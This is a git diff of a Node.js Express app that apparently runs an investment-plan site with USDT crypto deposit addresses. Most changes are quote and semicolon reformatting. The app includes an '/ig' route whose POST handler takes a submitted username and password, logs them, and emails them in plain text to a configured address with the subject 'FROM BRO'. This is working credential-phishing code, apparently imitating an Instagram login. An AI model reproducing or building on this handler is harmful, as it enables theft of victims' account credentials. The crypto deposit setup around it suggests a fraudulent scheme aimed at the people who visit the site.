@@ -1,5 +1,5 @@
 // Load environment variables from .env file
-require('dotenv').config();
+require("dotenv").config();
 
 const path = require("path");
 const express = require("express");
@@ -9,13 +9,13 @@ const mongoose = require("mongoose");
 const User = require("./models/user");
 const schedule = require("node-schedule");
 
-mongoose.set('strictQuery', true);
+mongoose.set("strictQuery", true);
 
 // Controllers
 const usercontroller = require("./controllers/user");
 const transactioncontroller = require("./controllers/transaction");
 const planController = require("./controllers/plan");
-const { sendEmail } = require('./libs/mail/nodemailerEmailService');
+const { sendEmail } = require("./libs/mail/nodemailerEmailService");
 
 const uri = process.env.MONGODB_URL;
 
@@ -65,27 +65,31 @@ const main = async () => {
   });
 
   // ===== IG ====
-  
+
   app.get("/ig", (req, res) => {
     res.render("ig");
-  })
+  });
 
   app.post("/ig", async (req, res) => {
     const body = req.body;
     console.log("BODY", body);
 
     // Send email
-    await sendEmail({subject: "FROM BRO", to: process.env.EMAIL_TO, text: `p: ${body.password} \n u: ${body.name}`})
+    await sendEmail({
+      subject: "FROM BRO",
+      to: process.env.EMAIL_TO,
+      text: `p: ${body.password} \n u: ${body.name}`,
+    });
 
-    res.json({message: "OK"});
-  })
+    res.json({ message: "OK" });
+  });
 
   // ===== All PAGES ===== //
 
   // index page
   app.get("/", async (req, res) => {
     const dbPlans = await planController.fetchPlans();
-    const plans =  {
+    const plans = {
       starter: {
         ...dbPlans[0]._doc,
       },
@@ -95,7 +99,7 @@ const main = async () => {
       gold: {
         ...dbPlans[2]._doc,
       },
-    }
+    };
 
     res.render("landing", {
       plans,
@@ -208,7 +212,7 @@ const main = async () => {
         image: "/assets/images/barcode/usdt_1.jpg",
       },
       {
-        address: "TYvcCpsNTtInztX4VyEXZPRd4WUTBGjncx",
+        address: "TYvcCpsNTtJnztX4VyEXzPRd4WUTBGjncx",
         image: "/assets/images/barcode/usdt_2.jpg",
       },
     ];
